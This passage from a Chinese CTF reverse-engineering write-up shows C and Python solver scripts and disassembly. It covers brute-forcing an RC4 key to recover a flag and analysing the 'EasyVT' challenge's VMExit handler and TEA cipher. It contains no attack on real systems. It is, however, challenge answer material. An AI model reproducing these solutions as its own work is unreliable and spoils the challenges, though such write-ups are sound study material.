915572239428449843076691286116796614</span></span><br></pre></td></tr></table></figure><p>退出的第二个函数，将编码后的结果进行魔改的SHA1? 计算，但是跑一下很久，很奇怪？</p><p>退出的第三个函数，RC4加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rc4_init((sbox, (<span class="type">int</span>)&amp;unk_408182, <span class="number">6u</span>);</span><br><span class="line">rc4_crypt(sbox, (<span class="type">int</span>)&amp;unk_4084C0, <span class="number">112u</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;unk_4084C0, byte_408090, <span class="number">112u</span>) )</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>dword_408182</code>正好是输入的字符串<code>str[42:48]</code></p><p>爆rc4密钥反推前6个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> payload[<span class="number">112</span>] = &#123;<span class="string">&quot;1423106315032466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> final[<span class="number">112</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xF2</span>, <span class="number">0x57</span>, <span class="number">0xF1</span>, <span class="number">0x7A</span>, <span class="number">0x5A</span>, <span class="number">0x22</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x43</span>, <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0x9B</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0xC0</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x12</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x8A</span>, <span class="number">0x8C</span>, <span class="number">0x4C</span>, <span class="number">0xED</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0x76</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xAF</span>, <span class="number">0x05</span>, <span class="number">0x38</span>, <span class="number">0xED</span>, <span class="number">0x42</span>, <span class="number">0x3E</span>, <span class="number">0x42</span>, <span class="number">0xDF</span>, </span><br><span class="line">  <span class="number">0x5D</span>, <span class="number">0xBE</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF3</span>, <span class="number">0x1C</span>, <span class="number">0xCF</span>, <span class="number">0xF8</span>, </span><br><span class="line">  <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x25</span>, <span class="number">0xE4</span>, <span class="number">0xB7</span>, <span class="number">0xB9</span>, <span class="number">0x36</span>, <span class="number">0xFB</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, </span><br><span class="line">  <span class="number">0xA0</span>, <span class="number">0xF0</span>, <span class="number">0x57</span>, <span class="number">0xAB</span>, <span class="number">0x21</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0x46</span>, <span class="number">0x99</span>, <span class="number">0xBD</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x5E</span>, <span class="number">0xEE</span>, <span class="number">0x55</span>, <span class="number">0x18</span>, <span class="number">0xEE</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0x94</span>, <span class="number">0x5F</span>, <span class="number">0xB4</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0xD8</span>, <span class="number">0x6C</span>, <span class="number">0xE4</span>, <span class="number">0xC0</span>, </span><br><span class="line">  <span class="number">0x9D</span>, <span class="number">0x6B</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x94</span>, <span class="number">0x5C</span>, <span class="number">0xDD</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0xE5</span>, <span class="number">0xB0</span>, <span class="number">0x93</span>, <span class="number">0xF1</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, </span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0x70</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// printf(&quot;%06d\n&quot;,i);</span></span><br><span class="line">        <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;%06d&quot;</span>,i);</span><br><span class="line">        <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> raw[<span class="number">112</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(raw,payload,<span class="number">112</span>);</span><br><span class="line">        rc4_init(sbox,buffer,<span class="number">6</span>);</span><br><span class="line">        rc4_crypt(sbox,(<span class="type">unsigned</span> <span class="type">char</span>*)raw,<span class="number">112</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">memcmp</span>(raw + <span class="number">16</span>,cipher +<span class="number">16</span>,<span class="number">0x60</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">            rc4_init(sbox,buffer,<span class="number">6</span>);</span><br><span class="line">            rc4_crypt(sbox,cipher,<span class="number">112</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,cipher);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到正确的结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">807391</span></span><br><span class="line"><span class="number">1523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">magic = [<span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xCD</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xCA</span>, <span class="number">0xC9</span>, <span class="number">0xC8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magic)):</span><br><span class="line">magic[i] = <span class="number">255</span> - magic[i]</span><br><span class="line"><span class="built_in">print</span>(magic)</span><br><span class="line">p = <span class="string">&quot;&quot;</span></span><br><span class="line">sb = <span class="string">&quot;1523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span></span><br><span class="line"><span class="comment"># sb = &quot;162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(sb)):</span><br><span class="line">p += <span class="built_in">bin</span>(<span class="built_in">int</span>(sb[i]))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(p),<span class="number">8</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(p[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 561516915572239428449843076691286116796614807391</span></span><br><span class="line"><span class="comment"># 807391</span></span><br></pre></td></tr></table></figure><h3 id="EasyVT"><a href="#EasyVT" class="headerlink" title="EasyVT"></a>EasyVT</h3><p>驱动部分打开了VT虚拟机，在<code>sub_401C90</code>是<code>#VMExit</code>的处理函数。美化后如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401C90</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> VM_EXIT_INSTRUCTION_LEN; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> VM_EXIT_REASON; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  VM_EXIT_REASON = vm_read(<span class="number">0x4402</span>);</span><br><span class="line">  VM_EXIT_INSTRUCTION_LEN = vm_read(<span class="number">0x440C</span>);</span><br><span class="line">  guest_eflags = vm_read(<span class="number">26656</span>);</span><br><span class="line">  guest_esp = vm_read(<span class="number">26652</span>);</span><br><span class="line">  guest_eip = vm_read(<span class="number">0x681E</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( VM_EXIT_REASON )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:                                    <span class="comment">// CPUID</span></span><br><span class="line">      handler_CPUID();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">18</span>:                                    <span class="comment">// VMCALL</span></span><br><span class="line">      handler_VMCALL();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">19</span>:                                    <span class="comment">// VMCLEAR</span></span><br><span class="line">      sub_F89DB2B0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">20</span>:                                    <span class="comment">// VMLAUNCH</span></span><br><span class="line">      sub_F89DB450();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">21</span>:                                    <span class="comment">// VMPTRLD</span></span><br><span class="line">      sub_F89DB7B0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">22</span>:                                    <span class="comment">// VMPTRST</span></span><br><span class="line">      tea_init();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">23</span>:                                    <span class="comment">// VMREAD</span></span><br><span class="line">      sub_F89DB970();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24</span>:                                    <span class="comment">// VMRESUME TEA</span></span><br><span class="line">      tea_enc();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">25</span>:                                    <span class="comment">// VMWRITE，这条才是真正的初始化，VMXON,VMCLEAR dont&#x27;care</span></span><br><span class="line">                                                <span class="comment">// 但是VMLAUNCH又要初始化一遍RC4 Key</span></span><br><span class="line">      sub_F89DBA90();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">26</span>:                                    <span class="comment">// VMXOFF</span></span><br><span class="line">      cmp();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">27</span>:                                    <span class="comment">// VMXON</span></span><br><span class="line">      sub_F89DB610();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">28</span>:                                    <span class="comment">// Control-register accesses. </span></span><br><span class="line">      sub_F89DB1D0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  vmwrite(<span class="number">0x681E</span>, VM_EXIT_INSTRUCTION_LEN + guest_eip);</span><br><span class="line">  vmwrite(<span class="number">0x681C</span>, guest_esp);</span><br><span class="line">  <span class="keyword">return</span> vmwrite(<span class="number">0x6820</span>, guest_eflags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个处理函数的上层用于设置和恢复环境，<code>vmresume</code>会恢复到虚拟机执行的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:F89DBC10                 mov     _guest_eax, eax</span><br><span class="line">.text:F89DBC15                 mov     guest_ecx, ecx</span><br><span class="line">.text:F89DBC1B                 mov     guest_edx, edx</span><br><span class="line">.text:F89DBC21                 mov     guest_ebx, ebx</span><br><span class="line">.text:F89DBC27                 mov     guest_esp, esp</span><br><span class="line">.text:F89DBC2D                 mov     guest_ebp, ebp</span><br><span class="line">.text:F89DBC33                 mov     guest_esi, esi</span><br><span class="line">.text:F89DBC39                 mov     guest_edi, edi</span><br><span class="line">.text:F89DBC3F                 pushf</span><br><span class="line">.text:F89DBC40                 pop     eax</span><br><span class="line">.text:F89DBC41                 mov     guest_eflags, eax</span><br><span class="line">.text:F89DBC46                 mov     ax, fs</span><br><span class="line">.text:F89DBC49                 mov     fs, ax</span><br><span class="line">.text:F89DBC4C                 mov     ax, gs</span><br><span class="line">.text:F89DBC4F                 mov     gs, ax</span><br><span class="line">.text:F89DBC52                 call    sub_F89DBC90</span><br><span class="line">.text:F89DBC57                 mov     eax, _guest_eax</span><br><span class="line">.text:F89DBC5C                 mov     ecx, guest_ecx</span><br><span class="line">.text:F89DBC62                 mov     edx, guest_edx</span><br><span class="line">.text:F89DBC68                 mov     ebx, guest_ebx</span><br><span class="line">.text:F89DBC6E                 mov     esp, guest_esp</span><br><span class="line">.text:F89DBC74                 mov     ebp, guest_ebp</span><br><span class="line">.text:F89DBC7A                 mov     esi, guest_esi</span><br><span class="line">.text:F89DBC80                 mov     edi, guest_edi</span><br><span class="line">.text:F89DBC86                 vmresume</span><br></pre></td></tr></table></figure><p>应用程序方面，由于已经在虚拟机内了，执行这些虚拟化指令均会导致<code>#VMExit</code>，执行上述处理函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:00401111 loc_401111:                             ; CODE XREF: _main+97↓j</span><br><span class="line">.text:00401111                 mov     eax, [ebp-0Ch]</span><br><span class="line">.text:00401114                 add     eax, 1</span><br><span class="line">.text:00401117                 mov     [ebp-0Ch], eax</span><br><span class="line">.text:0040111A</span><br><span class="line">.text:0040111A loc_40111A:                             ; CODE XREF: _main+4F↑j</span><br><span class="line">.text:0040111A                 cmp     dword ptr [ebp-0Ch], 4</span><br><span class="line">.text:0040111E                 jge     short loc_401159</span><br><span class="line">.text:00401120                 mov     eax, offset Buffer</span><br><span class="line">.text:00401125                 mov     ecx, [ebp-0Ch]</span><br><span class="line">.text:00401128                 mov     esi, [eax+ecx*8]</span><br><span class="line">.text:0040112B                 mov     edi, [eax+ecx*8+4]</span><br><span class="line">.text:0040112F                 vmxon   [esp+0DCh+var_DC]</span><br><span class="line">.text:00401134                 vmclear [esp+0DCh+var_DC]</span><br><span class="line">.text:00401139                 vmptrld [esp+0DCh+var_DC]</span><br><span class="line">.text:0040113D                 vmwrite eax, ecx</span><br><span class="line">.text:00401140                 vmlaunch</span><br><span class="line">.text:00401143                 vmread  ecx, eax</span><br><span class="line">.text:00401146                 vmcall</span><br><span class="line">.text:00401149                 vmptrst [esp+0DCh+var_DC]</span><br><span class="line">.text:0040114D                 vmresume</span><br><span class="line">.text:00401150                 vmxoff</span><br><span class="line">.text:00401153                 test    eax, eax</span><br><span class="line">.text:00401155                 jz      short loc_40116A</span><br><span class="line">.text:00401157                 jmp     short loc_401111</span><br></pre></td></tr></table></figure><p>所以按执行顺序分析<code>#VMExit</code> 的<code>Handler</code>即可。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> e[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x94</span>, <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x5C</span>, <span class="number">0xB3</span>, <span class="number">0x5C</span>, <span class="number">0x80</span>, <span class="number">0x0D</span>, <span class="number">0x86</span>, <span class="number">0xA5</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0x87</span>, <span class="number">0x8E</span>, <span class="number">0xFB</span>, <span class="number">0x17</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0xEF</span>, <span class="number">0x20</span>, <span class="number">0x65</span>, </span><br><span class="line">  <span class="number">0xAF</span>, <span class="number">0x87</span>, <span class="number">0x49</span>, <span class="number">0x5A</span>, <span class="number">0xA4</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0xCF</span>, <span class="number">0x38</span>, <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">1</span>], v1 = v[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// printf(&quot;0x%x, 0x%x,\n&quot;, v[0], v[1]);</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x20000000</span> - (<span class="number">32</span> * <span class="number">0xC95D6ABF</span>);        <span class="comment">/* 初始化 */</span></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xC95D6ABF</span>; <span class="comment">/* 密钥调度常数 */</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">32</span>;                  <span class="comment">/* 轮数 */</span></span><br><span class="line">    <span class="keyword">while</span> (n-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 基本循环开始 */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">0</span>]);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">1</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*循环结束*/</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum, v0 = v[<span class="number">0</span>], v1 = v[<span 